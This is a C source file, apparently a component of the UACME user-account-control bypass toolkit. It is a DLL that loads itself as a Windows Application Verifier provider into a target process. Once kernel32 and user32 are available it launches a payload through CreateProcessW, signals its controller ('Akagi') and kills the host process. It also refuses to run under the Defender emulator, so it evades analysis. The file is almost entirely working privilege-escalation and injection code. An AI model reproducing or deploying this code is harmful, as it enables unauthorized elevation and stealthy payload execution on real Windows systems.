/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2018
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.10
*
*  DATE:        18 Nov 2018
*
*  AVrf entry point, Hibiki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

#include "shared\shared.h"
#include "shared\libinc.h"

#define LoadedMsg      "Hibiki lock and loaded"

static RTL_VERIFIER_PROVIDER_DESCRIPTOR g_avrfProvider;
static RTL_VERIFIER_THUNK_DESCRIPTOR avrfThunks[2];
static RTL_VERIFIER_DLL_DESCRIPTOR avrfDlls[2];
static HMODULE g_pvKernel32;

PFNCREATEPROCESSW pCreateProcessW = NULL;

UACME_PARAM_BLOCK g_SharedParams;

/*
* ucmLoadCallback
*
* Purpose:
*
* Image load notify callback, when kernel32 available - acquire import and run target application.
*
*/
VOID NTAPI ucmLoadCallback(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved
)
{
    BOOL bSharedParamsReadOk;

    NTSTATUS Status;

    PWSTR lpParameter = NULL;
    ULONG cbParameter = 0UL;

    UNREFERENCED_PARAMETER(DllSize);
    UNREFERENCED_PARAMETER(Reserved);

    if (DllName == NULL) {
        return;
    }

    if (_strcmpi(DllName, L"kernel32.dll") == 0) {
        g_pvKernel32 = (HMODULE)DllBase;
    }

    if (_strcmpi(DllName, L"user32.dll") == 0) {
        if (g_pvKernel32) {

#pragma warning(push)
#pragma warning(disable: 4152)

            pCreateProcessW = (PFNCREATEPROCESSW)ucmLdrGetProcAddress(
                (PCHAR)g_pvKernel32,
                "CreateProcessW");

#pragma warning(pop)

            if (pCreateProcessW != NULL) {

                //
                // Read shared params block.
                //
                RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
                bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
                if (bSharedParamsReadOk) {
                    lpParameter = g_SharedParams.szParameter;
                    cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
                }
                else {
                    lpParameter = NULL;
                    cbParameter = 0UL;
                }

                if (ucmLaunchPayloadEx(
                    pCreateProcessW,
                    lpParameter,
                    cbParameter))
                {
                    Status = STATUS_SUCCESS;
                }
                else {
                    Status = STATUS_UNSUCCESSFUL;
                }

                //
                // Notify Akagi.
                //
                if (bSharedParamsReadOk) {
                    ucmSetCompletion(g_SharedParams.szSignalObject);
                }

                NtTerminateProcess(NtCurrentProcess(), Status);
            }
        }
    }
}

/*
* ucmRegisterProvider
*
* Purpose:
*
* Register provider and set up image load notify callback.
*
*/
VOID ucmRegisterProvider(
    VOID
)
{
    RtlSecureZeroMemory(&avrfThunks, sizeof(avrfThunks)); //for future case

    avrfThunks[0].ThunkName = NULL;
    avrfThunks[0].ThunkOldAddress = NULL;
    avrfThunks[0].ThunkNewAddress = NULL;

    RtlSecureZeroMemory(&avrfDlls, sizeof(avrfDlls)); //for future case

    avrfDlls[0].DllName = NULL;
    avrfDlls[0].DllFlags = 0;
    avrfDlls[0].DllAddress = NULL;
    avrfDlls[0].DllThunks = avrfThunks;

    RtlSecureZeroMemory(&g_avrfProvider, sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR));
    g_avrfProvider.Length = sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR);
    g_avrfProvider.ProviderDlls = avrfDlls;
    g_avrfProvider.ProviderDllLoadCallback = (RTL_VERIFIER_DLL_LOAD_CALLBACK)&ucmLoadCallback;
}

/*
* DllMain
*
* Purpose:
*
* Verifier dll entry point, register verifier provider.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    PRTL_VERIFIER_PROVIDER_DESCRIPTOR* pVPD = (PRTL_VERIFIER_PROVIDER_DESCRIPTOR*)lpvReserved;

    UNREFERENCED_PARAMETER(hinstDLL);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
        return FALSE;

    switch (fdwReason) {

    case DLL_PROCESS_VERIFIER:
        DbgPrint(LoadedMsg);
        ucmRegisterProvider();
        *pVPD = &g_avrfProvider;
        break;
    }

    return TRUE;
}
